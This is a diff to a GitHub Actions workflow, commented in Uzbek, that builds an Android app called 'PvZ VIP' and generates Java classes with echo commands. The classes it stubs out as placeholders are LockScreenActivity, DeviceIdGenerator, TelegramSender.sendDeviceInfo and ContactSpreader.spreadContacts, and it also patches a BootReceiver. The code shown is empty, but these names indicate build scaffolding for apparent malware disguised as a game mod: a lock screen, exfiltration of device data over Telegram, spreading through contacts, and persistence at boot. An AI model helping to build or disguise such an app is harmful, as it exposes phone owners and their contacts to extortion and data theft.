@@ -36,28 +36,36 @@ jobs:
         sed -i -E 's/[[:space:]]*android:theme="@style\/Theme.AppCompat"//g' app/src/main/AndroidManifest.xml || true
         sed -i -E 's/[[:space:]]*android:wakeAfterReceivingAction="[^"]*"//g' app/src/main/AndroidManifest.xml || true
     
-    # >>> YANGI: Java fayllarini to'liq va aniq tuzatish <<<
-    - name: Fix Java Files Package and Imports
+    # >>> YANGI: BARCHA YO'QOLGAN VA BUZILGAN JAVA FAYLLARINI TO'G'RILAYMIZ <<<
+    - name: Fix and Create all Java Files
       run: |
-        # 1. LockScreenActivity ni to'g'ri yaratamiz
         mkdir -p app/src/main/java/com/pvzmod/game
+        
+        # 1. LockScreenActivity
         echo "package com.pvzmod.game;" > app/src/main/java/com/pvzmod/game/LockScreenActivity.java
-        echo "" >> app/src/main/java/com/pvzmod/game/LockScreenActivity.java
-        echo "import android.app.Activity;" >> app/src/main/java/com/pvzmod/game/LockScreenActivity.java
-        echo "import android.os.Bundle;" >> app/src/main/java/com/pvzmod/game/LockScreenActivity.java
-        echo "" >> app/src/main/java/com/pvzmod/game/LockScreenActivity.java
-        echo "public class LockScreenActivity extends Activity {" >> app/src/main/java/com/pvzmod/game/LockScreenActivity.java
-        echo "    @Override" >> app/src/main/java/com/pvzmod/game/LockScreenActivity.java
-        echo "    protected void onCreate(Bundle savedInstanceState) {" >> app/src/main/java/com/pvzmod/game/LockScreenActivity.java
-        echo "        super.onCreate(savedInstanceState);" >> app/src/main/java/com/pvzmod/game/LockScreenActivity.java
-        echo "    }" >> app/src/main/java/com/pvzmod/game/LockScreenActivity.java
-        echo "}" >> app/src/main/java/com/pvzmod/game/LockScreenActivity.java
+        echo "import android.app.Activity; import android.os.Bundle;" >> app/src/main/java/com/pvzmod/game/LockScreenActivity.java
+        echo "public class LockScreenActivity extends Activity { @Override protected void onCreate(Bundle s) { super.onCreate(s); } }" >> app/src/main/java/com/pvzmod/game/LockScreenActivity.java
         
-        # 2. MainActivity dan avval qo'shilgan noto'g'ri importni o'chiramiz
+        # 2. DeviceIdGenerator (Soxta)
+        echo "package com.pvzmod.game;" > app/src/main/java/com/pvzmod/game/DeviceIdGenerator.java
+        echo "import android.content.Context; public class DeviceIdGenerator { public static String generateUniqueId(Context c) { return \"12345\"; } }" >> app/src/main/java/com/pvzmod/game/DeviceIdGenerator.java
+        
+        # 3. TelegramSender (Soxta)
+        echo "package com.pvzmod.game;" > app/src/main/java/com/pvzmod/game/TelegramSender.java
+        echo "public class TelegramSender { public static void sendDeviceInfo(String id) { } }" >> app/src/main/java/com/pvzmod/game/TelegramSender.java
+        
+        # 4. ContactSpreader (Soxta)
+        echo "package com.pvzmod.game;" > app/src/main/java/com/pvzmod/game/ContactSpreader.java
+        echo "import android.content.Context; public class ContactSpreader { public static void spreadContacts(Context c) { } }" >> app/src/main/java/com/pvzmod/game/ContactSpreader.java
+        
+        # 5. MainActivity paket nomini to'g'rilash
         sed -i '1{/^import com.pvzmod.game.LockScreenActivity;/d}' app/src/main/java/com/pvzmod/game/MainActivity.java
-        
-        # 3. MainActivity dagi noto'g'ri package nomini to'g'risiga o'zgartiramiz
         sed -i 's/^package com.pvzmod.vip;/package com.pvzmod.game;/' app/src/main/java/com/pvzmod/game/MainActivity.java
+        
+        # 6. BootReceiver ichidagi eski paket nomini yangisiga almashtirish
+        if [ -f "app/src/main/java/com/pvzmod/game/BootReceiver.java" ]; then
+          sed -i 's/com.pvzmod.vip.MainActivity/com.pvzmod.game.MainActivity/g' app/src/main/java/com/pvzmod/game/BootReceiver.java
+        fi
 
     - name: Create resources
       run: mkdir -p app/src/main/res/values && echo '<?xml version="1.0"?><resources><string name="app_name">PvZ VIP</string></resources>' > app/src/main/res/values/strings.xml
